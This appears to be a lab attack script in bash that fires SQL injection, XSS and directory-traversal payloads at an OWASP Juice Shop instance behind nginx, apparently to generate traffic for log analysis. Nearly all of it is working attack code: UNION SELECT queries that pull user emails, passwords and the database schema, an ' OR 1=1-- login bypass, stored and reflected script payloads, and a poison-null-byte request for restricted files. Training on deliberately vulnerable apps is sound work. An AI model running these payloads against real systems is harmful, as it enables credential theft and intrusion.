#!/usr/bin/env bash
# Scripted SQLi, XSS, and directory traversal against Juice Shop via nginx.
set -euo pipefail

TARGET_URL="${TARGET_URL:-http://nginx:8080/}"
BASE="${TARGET_URL%/}"
UA="${USER_AGENT:-Mozilla/5.0 (compatible; cyber-lab-attack-script/1.0)}"

pass() { echo "[PASS] $*"; }
fail() { echo "[FAIL] $*"; }
section() { echo; echo "== $* =="; }

curl_quiet() {
  curl -sf -A "${UA}" "$@"
}

curl_body() {
  curl -s -A "${UA}" "$@"
}

wait_for_target() {
  echo "Target: ${BASE}"
  echo "Waiting for ${BASE}..."
  for _ in $(seq 1 30); do
    if curl_quiet -o /dev/null "${BASE}/"; then
      return 0
    fi
    sleep 2
  done
  fail "Target unreachable: ${BASE}"
  exit 1
}

attack_sqli() {
  section "SQL Injection"

  local payload_users="')) union select '1',id,email,password,'5','6','7','8','9' from Users--"
  local response
  response="$(curl_body "${BASE}/rest/products/search?q=${payload_users}")"

  if echo "${response}" | grep -qi '@juice-sh.op'; then
    pass "UNION SELECT exfiltrated user credentials from search endpoint"
    echo "${response}" | grep -oiE '"email":"[^"]+"' | head -3
  else
    fail "UNION SELECT did not return user emails"
  fi

  local payload_schema="qwert')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--"
  response="$(curl_body "${BASE}/rest/products/search?q=${payload_schema}")"

  if echo "${response}" | grep -qi 'CREATE TABLE'; then
    pass "UNION SELECT exfiltrated database schema from sqlite_master"
  else
    fail "Schema exfiltration payload did not return CREATE TABLE statements"
  fi

  local login_status
  login_status="$(curl -s -o /dev/null -w '%{http_code}' -A "${UA}" \
    -X POST "${BASE}/rest/user/login" \
    -H 'Content-Type: application/json' \
    -d '{"email":"'\'' OR 1=1--","password":"x"}')"

  if [ "${login_status}" = "200" ]; then
    pass "Login SQLi bypass returned HTTP 200"
  else
    fail "Login SQLi bypass returned HTTP ${login_status} (expected 200)"
  fi
}

attack_xss() {
  section "Cross-Site Scripting (XSS)"

  local email="xss-$(date +%s)@scripted.test"
  local xss_payload='<iframe src="javascript:alert('\''xss'\'')"></iframe>'
  local register_status register_body
  register_body="$(curl -s -A "${UA}" \
    -X POST "${BASE}/api/Users" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${xss_payload}\",\"password\":\"xss\",\"passwordRepeat\":\"xss\"}")"
  register_status="$(echo "${register_body}" | grep -o '"status":"[^"]*"' || true)"

  if echo "${register_body}" | grep -qi '"email"'; then
    pass "Stored XSS payload accepted via POST /api/Users (API-only XSS)"
  else
    fail "Stored XSS registration did not succeed: ${register_body}"
  fi

  local reflected
  reflected="$(curl_body "${BASE}/rest/products/search?q=<script>alert('xss')</script>")"

  if echo "${reflected}" | grep -qi '<script>alert'; then
    pass "Reflected XSS payload echoed in search response"
  else
    fail "Reflected XSS payload not echoed in search response"
  fi
}

attack_directory_traversal() {
  section "Directory Traversal / Sensitive File Exposure"

  local listing
  listing="$(curl_body "${BASE}/ftp/")"

  if echo "${listing}" | grep -qi 'acquisitions.md'; then
    pass "Directory listing exposed at /ftp/"
    echo "${listing}" | grep -oE 'href="[^"]+"' | head -5
  else
    fail "/ftp/ directory listing did not expose expected files"
  fi

  local doc
  doc="$(curl_body "${BASE}/ftp/acquisitions.md")"

  if echo "${doc}" | grep -qi 'acquisition'; then
    pass "Sensitive document readable at /ftp/acquisitions.md"
  else
    fail "Could not read /ftp/acquisitions.md"
  fi

  local poison
  poison="$(curl_body "${BASE}/ftp/coupons_2013.md.bak%2500.md")"

  if [ -n "${poison}" ] && ! echo "${poison}" | grep -qi 'Error'; then
    pass "Poison-null-byte bypass retrieved restricted file content"
  else
    fail "Poison-null-byte traversal did not return file content"
  fi
}

main() {
  wait_for_target
  attack_sqli
  attack_xss
  attack_directory_traversal
  echo
  echo "Attack script finished. Check nginx logs in shop/logs/ for recorded traffic."
}

main "$@"
